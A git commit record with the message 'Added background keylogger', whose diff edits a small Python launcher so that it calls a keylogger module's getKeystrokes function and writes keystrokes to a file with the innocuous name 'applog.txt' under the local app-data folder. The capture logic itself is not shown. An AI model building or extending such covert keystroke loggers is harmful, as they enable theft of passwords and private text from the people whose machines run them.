230c9ce21ca4010a6c45090d122bca82aab3d3f6
Erik Ellis <elliserik69@gmail.com>
2019-11-25 17:40:38 -0500

    Added background keylogger

--- Keyloggers/keylogger1Main.py
+++ Keyloggers/keylogger1Main.py
@@ -1,11 +1,11 @@
 import os
-from Keyloggers import keylogger
+from Keyloggers import keylogger1
 
 def main():
     log_dir = os.environ['localappdata']
     log_name = 'applog.txt'
 
-    keylogger.getKeystrokes(log_dir, log_name)
+    keylogger1.getKeystrokes(log_dir, log_name)
 
 if __name__== '__main__':
         main()
